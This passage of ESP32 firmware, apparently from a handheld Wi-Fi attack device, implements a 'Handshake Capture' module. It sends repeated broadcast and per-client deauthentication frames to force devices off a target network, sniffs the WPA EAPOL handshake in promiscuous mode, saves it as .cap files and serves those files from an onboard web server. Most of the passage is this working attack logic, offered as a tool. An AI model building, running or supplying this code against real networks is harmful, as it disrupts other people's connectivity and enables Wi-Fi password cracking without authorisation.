    auth_captured = false;
    assoc_captured = false;
    handshake_started = false;
    for (int i = 0; i < 4; i++) eapol_types[i] = 0;
    
    Serial.printf("\n🔴 Starting capture for %s...\n", target.ssid.c_str());
    Serial.printf("📡 Channel: %d\n", target.ch);
    Serial.printf("👥 Existing clients: %d\n", clientCount);
    Serial.println("📋 Using BROADCAST DEAUTH on AP and all clients");
    
    if (deauth) {
        if (!webServerActive) {
            WiFi.mode(WIFI_AP_STA);
            WiFi.softAP("ESP32-Capture", "12345678", target.ch);
            delay(100);
        } else {
            esp_wifi_set_channel(target.ch, WIFI_SECOND_CHAN_NONE);
        }
    } else {
        WiFi.mode(WIFI_STA);
        WiFi.disconnect();
        delay(100);
    }
    
    esp_wifi_set_channel(target.ch, WIFI_SECOND_CHAN_NONE);
    
    if (!promiscuous_enabled) {
        esp_wifi_set_promiscuous(false);
        delay(50);
        esp_wifi_set_promiscuous_rx_cb(handshakePromiscuousRxCallback);
        esp_wifi_set_promiscuous(true);
        promiscuous_enabled = true;
        Serial.println("✅ Promiscuous mode enabled");
    }
    
    handshakePcapInit();
    
    if (deauth) {
        Serial.println("🔊 Sending BROADCAST DEAUTH to AP and all clients...");
        
        for (int round = 0; round < 5; round++) {
            for (int i = 0; i < 10; i++) {
                handshakeSendBroadcastDeauth();
                delay(2);
            }
            Serial.printf("  Round %d: %d deauth packets sent\n", round + 1, deauth_count);
            delay(50);
        }
        
        deauth_active = true;
        last_deauth_time = millis();
    }
    
    delay(500);
    showHandshakeMonitor(deauth);
}

void handshakeStartCaptureWithClient(bool deauth) {
    if (target.ssid == "") {
        Serial.println("No target selected.");
        return;
    }
    if (is_capturing) return;
    
    eapol_count = 0;
    with_deauth = deauth;
    is_capturing = true;
    deauth_active = deauth;
    deauth_count = 0;
    deauth_seq = 0;
    last_deauth_time = 0;
    beacon_captured = false;
    capture_completed = false;
    capture_start_time = millis();
    last_eapol_time = 0;
    total_frames_captured = 0;
    auth_captured = false;
    assoc_captured = false;
    handshake_started = false;
    for (int i = 0; i < 4; i++) eapol_types[i] = 0;
    
    Serial.printf("\n🔴 Starting capture for %s...\n", target.ssid.c_str());
    Serial.printf("📡 Channel: %d\n", target.ch);
    Serial.println("📋 Using BROADCAST DEAUTH on AP and all clients");
    
    if (deauth) {
        if (!webServerActive) {
            WiFi.mode(WIFI_AP_STA);
            WiFi.softAP("ESP32-Capture", "12345678", target.ch);
            delay(100);
        } else {
            esp_wifi_set_channel(target.ch, WIFI_SECOND_CHAN_NONE);
        }
    } else {
        WiFi.mode(WIFI_STA);
        WiFi.disconnect();
        delay(100);
    }
    
    esp_wifi_set_channel(target.ch, WIFI_SECOND_CHAN_NONE);
    
    if (!promiscuous_enabled) {
        esp_wifi_set_promiscuous(false);
        delay(50);
        esp_wifi_set_promiscuous_rx_cb(handshakePromiscuousRxCallback);
        esp_wifi_set_promiscuous(true);
        promiscuous_enabled = true;
        Serial.println("✅ Promiscuous mode enabled");
    }
    
    handshakePcapInit();
    
    if (deauth) {
        Serial.println("🔊 Sending BROADCAST DEAUTH to AP and all clients...");
        
        for (int round = 0; round < 5; round++) {
            for (int i = 0; i < 10; i++) {
                handshakeSendBroadcastDeauth();
                delay(2);
            }
            Serial.printf("  Round %d: %d deauth packets sent\n", round + 1, deauth_count);
            delay(50);
        }
        
        int connectedCount = 0;
        for (int i = 0; i < clientCount; i++) {
            if (clients[i].is_connected) connectedCount++;
        }
        
        if (connectedCount > 0) {
            Serial.printf("🎯 Also deauthing %d connected clients...\n", connectedCount);
            for (int round = 0; round < 3; round++) {
                for (int i = 0; i < clientCount; i++) {
                    if (clients[i].is_connected) {
                        handshakeDeauthClient(clients[i].mac);
                        delay(2);
                    }
                }
                delay(50);
            }
        }
        
        deauth_active = true;
        last_deauth_time = millis();
    }
    
    delay(500);
    showHandshakeMonitor(deauth);
}

void handshakeStopCapture() {
    if (!is_capturing) return;
    
    if (promiscuous_enabled) {
        esp_wifi_set_promiscuous(false);
        esp_wifi_set_promiscuous_rx_cb(nullptr);
        promiscuous_enabled = false;
    }
    
    if (pcap_buffer && pcap_size > 0 && !capture_completed) {
        if (eapol_count >= 4) {
            handshakeSaveHandshake();
        } else if (eapol_count >= 2) {
            Serial.printf("⚠️ Partial handshake (%d EAPOL frames). Saving anyway...\n", eapol_count);
            handshakeSaveHandshake();
        } else {
            Serial.printf("❌ Not enough EAPOL frames (%d). Discarding capture.\n", eapol_count);
            if (pcap_buffer) {
                free(pcap_buffer);
                pcap_buffer = nullptr;
                pcap_size = 0;
            }
        }
    } else {
        if (pcap_buffer) {
            free(pcap_buffer);
            pcap_buffer = nullptr;
            pcap_size = 0;
        }
    }
    
    is_capturing = false;
    deauth_active = false;
    eapol_count = 0;
    beacon_captured = false;
    capture_completed = false;
    
    if (with_deauth && !webServerActive) {
        WiFi.softAPdisconnect(true);
        WiFi.mode(WIFI_STA);
        delay(100);
    }
    
    showHandshakeMainMenu();
}

// =================================================
// SANITIZE FILENAME - FIXED FOR LONG NAMES
// =================================================
String handshakeSanitizeFilename(String input) {
    String result = input;
    
    // Remove special characters
    result.replace(" ", "_");
    result.replace("-", "_");
    result.replace(".", "_");
    result.replace("(", "");
    result.replace(")", "");
    result.replace("[", "");
    result.replace("]", "");
    result.replace("{", "");
    result.replace("}", "");
    result.replace("<", "");
    result.replace(">", "");
    result.replace(":", "");
    result.replace(";", "");
    result.replace("'", "");
    result.replace("\"", "");
    result.replace("?", "");
    result.replace("!", "");
    result.replace("@", "");
    result.replace("#", "");
    result.replace("$", "");
    result.replace("%", "");
    result.replace("^", "");
    result.replace("&", "");
    result.replace("*", "");
    result.replace("+", "");
    result.replace("=", "");
    result.replace("/", "");
    result.replace("\\", "");
    result.replace("|", "");
    result.replace("~", "");
    result.replace("`", "");
    result.replace(",", "_");
    
    // Remove double underscores
    while (result.indexOf("__") != -1) result.replace("__", "_");
    
    // Limit length to 20 characters
    if (result.length() > 20) {
        result = result.substring(0, 20);
    }
    
    // Ensure not empty
    if (result.length() == 0) result = "network";
    
    return result;
}

// =================================================
// BUTTON HANDLING
// =================================================
void handleHandshakeButtons() {
    static unsigned long lastButtonTime = 0;
    unsigned long now = millis();
    if (now - lastButtonTime < 200) return;
    
    if (isButtonPressed(BTN_BACK)) {
        lastButtonTime = now;
        if (inSubMenu) {
            if (subMenuType == 2) {
                stopWebServer();
            }
            if (subMenuType == 4) {
                inSubMenu = false;
                subMenuType = 0;
                handshakeMenuLevel = 0;
                handshakeMenuIndex = 0;
                clientListIndex = 0;
                clientEmptyIndex = 0;
                showHandshakeMainMenu();
                return;
            }
            inSubMenu = false;
            subMenuType = 0;
            handshakeMenuLevel = 0;
            handshakeMenuIndex = 0;
            clientListIndex = 0;
            clientEmptyIndex = 0;
            showHandshakeMainMenu();
        } else if (is_capturing) {
            handshakeStopCapture();
        } else {
            exitModule();
            return;
        }
        return;
    }
    
    if (isButtonPressed(BTN_UP)) {
        lastButtonTime = now;
        
        if (handshakeMenuLevel == 0) {
            handshakeMenuIndex = (handshakeMenuIndex - 1 + handshakeMainCount) % handshakeMainCount;
            drawScrollingMenu(handshakeMainItems, handshakeMainCount, handshakeMenuIndex, 4, "Handshake Capture", 18);
        } 
        else if (handshakeMenuLevel == 1) {
            int count = 0;
            for (int i = 0; i < 20; i++) {
                if (networks[i].ssid != "") count++;
            }
            if (count > 0) {
                int totalItems = count + 1;
                handshakeMenuIndex = (handshakeMenuIndex - 1 + totalItems) % totalItems;
                showHandshakeNetworkList();
            }
        } 
        else if (handshakeMenuLevel == 2) {
            int count = 0;
            File root = SPIFFS.open("/");
            if (root) {
                File file = root.openNextFile();
                while (file) {
                    String name = file.name();
                    if (name.endsWith(".cap")) count++;
                    file = root.openNextFile();
                }
                root.close();
            }
            int totalItems = count + 2;
            handshakeMenuIndex = (handshakeMenuIndex - 1 + totalItems) % totalItems;
            showHandshakeFileList();
        }
        else if (handshakeMenuLevel == 4) {
            if (clientCount > 0) {
                int totalItems = clientCount + 1;
                clientListIndex = (clientListIndex - 1 + totalItems) % totalItems;
                showClientList();
            } else {
                int totalItems = 3;
                clientEmptyIndex = (clientEmptyIndex - 1 + totalItems) % totalItems;
                showClientList();
            }
        }
        return;
    }
    
    if (isButtonPressed(BTN_DOWN)) {
        lastButtonTime = now;
        
        if (handshakeMenuLevel == 0) {
            handshakeMenuIndex = (handshakeMenuIndex + 1) % handshakeMainCount;
            drawScrollingMenu(handshakeMainItems, handshakeMainCount, handshakeMenuIndex, 4, "Handshake Capture", 18);
        } 
        else if (handshakeMenuLevel == 1) {
            int count = 0;
            for (int i = 0; i < 20; i++) {
                if (networks[i].ssid != "") count++;
            }
            if (count > 0) {
                int totalItems = count + 1;
                handshakeMenuIndex = (handshakeMenuIndex + 1) % totalItems;
                showHandshakeNetworkList();
            }
        } 
        else if (handshakeMenuLevel == 2) {
            int count = 0;
            File root = SPIFFS.open("/");
            if (root) {
                File file = root.openNextFile();
                while (file) {
                    String name = file.name();
                    if (name.endsWith(".cap")) count++;
                    file = root.openNextFile();
                }
                root.close();
            }
            int totalItems = count + 2;
            handshakeMenuIndex = (handshakeMenuIndex + 1) % totalItems;
            showHandshakeFileList();
        }
        else if (handshakeMenuLevel == 4) {
            if (clientCount > 0) {
                int totalItems = clientCount + 1;
                clientListIndex = (clientListIndex + 1) % totalItems;
                showClientList();
            } else {
                int totalItems = 3;
                clientEmptyIndex = (clientEmptyIndex + 1) % totalItems;
                showClientList();
            }
        }
        return;
    }
    
    if (isButtonPressed(BTN_SELECT)) {
        lastButtonTime = now;
        
        if (handshakeMenuLevel == 0) {
            switch(handshakeMenuIndex) {
                case 0: handshakeScanNetworks(); break;
                case 1: 
                    handshakeMenuIndex = 0;
                    showHandshakeNetworkList(); 
                    break;
                case 2:
                    clientListIndex = 0;
                    clientEmptyIndex = 0;
                    showClientList();
                    break;
                case 3: 
                    if (clientCount > 0 && clientListIndex < clientCount) {
                        handshakeStartCaptureWithClient(true);
                    } else {
                        handshakeStartCapture(true);
                    }
                    break;
                case 4: handshakeStartCapture(false); break;
                case 5: handshakeStopCapture(); break;
                case 6: startWebServer(); showHandshakeFileList(); break;
                case 7: 
                    if (is_capturing) handshakeStopCapture();
                    exitModule();
                    return;
            }
            return;
        }
        
        if (handshakeMenuLevel == 1) {
            int count = 0;
            for (int i = 0; i < 20; i++) {
                if (networks[i].ssid != "") count++;
            }
            if (count > 0 && handshakeMenuIndex < count) {
                selectHandshakeNetwork();
            } else {
                inSubMenu = false;
                subMenuType = 0;
                handshakeMenuLevel = 0;
                handshakeMenuIndex = 0;
                clientListIndex = 0;
                clientEmptyIndex = 0;
                showHandshakeMainMenu();
            }
            return;
        }
        
        if (handshakeMenuLevel == 2) {
            int fileCount = 0;
            File root = SPIFFS.open("/");
            if (root) {
                File file = root.openNextFile();
                while (file) {
                    String name = file.name();
                    if (name.endsWith(".cap")) fileCount++;
                    file = root.openNextFile();
                }
                root.close();
            }
            
            if (handshakeMenuIndex > 0 && handshakeMenuIndex <= fileCount) {
                showHandshakeFileList();
            } else if (handshakeMenuIndex == fileCount + 1) {
                inSubMenu = false;
                subMenuType = 0;
                handshakeMenuLevel = 0;
                handshakeMenuIndex = 0;
                clientListIndex = 0;
                clientEmptyIndex = 0;
                if (webServerActive) stopWebServer();
                showHandshakeMainMenu();
            }
            return;
        }
        
        if (handshakeMenuLevel == 4) {
            if (clientCount > 0 && clientListIndex < clientCount) {
                handshakeStartCaptureWithClient(true);
            } else if (clientCount == 0) {
                if (clientEmptyIndex == 1) {
                    handshakeScanNetworks();
                } else if (clientEmptyIndex == 2) {
                    inSubMenu = false;
                    subMenuType = 0;
                    handshakeMenuLevel = 0;
                    handshakeMenuIndex = 0;
                    clientListIndex = 0;
                    clientEmptyIndex = 0;
                    showHandshakeMainMenu();
                }
            } else {
                inSubMenu = false;
                subMenuType = 0;
                handshakeMenuLevel = 0;
                handshakeMenuIndex = 0;
                clientListIndex = 0;
                clientEmptyIndex = 0;
                showHandshakeMainMenu();
            }
            return;
        }
    }
}

// =================================================
// SETUP
// =================================================
void handshakeCaptureSetup() {
    Serial.println("\nHandshake Capture Module");
    Serial.println("================================");
    
    if (!SPIFFS.begin(false)) {
        SPIFFS.format();
        SPIFFS.begin(false);
    }
    
    Serial.printf("SPIFFS Total: %d bytes\n", SPIFFS.totalBytes());
    
    memset(networks, 0, sizeof(networks));
    memset(clients, 0, sizeof(clients));
    target.ssid = "";
    pcap_buffer = nullptr;
    pcap_size = 0;
    is_capturing = false;
    capture_completed = false;
    eapol_count = 0;
    promiscuous_enabled = false;
    clientCount = 0;
    wifi_initialized = false;
    webServerActive = false;
    inSubMenu = false;
    subMenuType = 0;
    handshakeMenuIndex = 0;
    handshakeMenuLevel = 0;
    clientListIndex = 0;
    clientEmptyIndex = 0;
    total_frames_captured = 0;
    for (int i = 0; i < 4; i++) eapol_types[i] = 0;
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    wifi_initialized = true;
    
    showHandshakeMainMenu();
    
    Serial.println("✅ Handshake Capture Ready");
    Serial.println("📥 Download files via Web Server: http://192.168.4.1");
    Serial.println("📋 Using BROADCAST DEAUTH on AP and all clients");
}

// =================================================
// LOOP
// =================================================
void handshakeCaptureLoop() {
    // ✅ Check if capture completed
    if (capture_completed) {
        deauth_active = false;
        if (promiscuous_enabled) {
            esp_wifi_set_promiscuous(false);
            esp_wifi_set_promiscuous_rx_cb(nullptr);
            promiscuous_enabled = false;
        }
        is_capturing = false;
    }
    
    // Deauth loop
    if (is_capturing && with_deauth && !capture_completed && deauth_active) {
        unsigned long now = millis();
        
        if (now - last_deauth_time > DEAUTH_INTERVAL_MS) {
            handshakeSendBroadcastDeauth();
            last_deauth_time = now;
        }
        
        // Timeout handling
        if (now - capture_start_time > 120000 && eapol_count == 0) {
            Serial.println("⏰ Timeout: No EAPOL frames detected after 120 seconds");
            handshakeStopCapture();
        }
        else if (handshake_started && eapol_count < 4 && (now - last_eapol_time > 30000)) {
            Serial.println("⏰ No new EAPOL frames for 30 seconds. Stopping...");
            handshakeStopCapture();
        }
    }
    
    if (inSubMenu && subMenuType == 3) {
        updateHandshakeMonitor();
    }
    
    if (webServerActive) {
        handleWebServer();
    }
    
    handleHandshakeButtons();
    delay(10);
}

// =================================================
// CLEANUP
// =================================================
void handshakeCleanup() {
    Serial.println("🧹 Handshake capture cleanup...");
    unsigned long startTime = millis();
    
    if (is_capturing) {
        handshakeStopCapture();
        delay(100);
    }
    
    if (promiscuous_enabled) {
        esp_wifi_set_promiscuous(false);
        esp_wifi_set_promiscuous_rx_cb(nullptr);
        promiscuous_enabled = false;
    }
    
    if (webServerActive) {
        stopWebServer();
    }
    
    if (pcap_buffer) {
        free(pcap_buffer);
        pcap_buffer = nullptr;
        pcap_size = 0;
    }
    
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(100);
    
    is_capturing = false;
    capture_completed = false;
    eapol_count = 0;
    inSubMenu = false;
    subMenuType = 0;
    clientCount = 0;
    deauth_count = 0;
    deauth_seq = 0;
    handshakeMenuIndex = 0;
    handshakeMenuLevel = 0;
    clientListIndex = 0;
    clientEmptyIndex = 0;
    total_frames_captured = 0;
    for (int i = 0; i < 4; i++) eapol_types[i] = 0;
    
    Serial.printf("✅ Handshake capture cleanup complete (%lu ms)\n", millis() - startTime);
}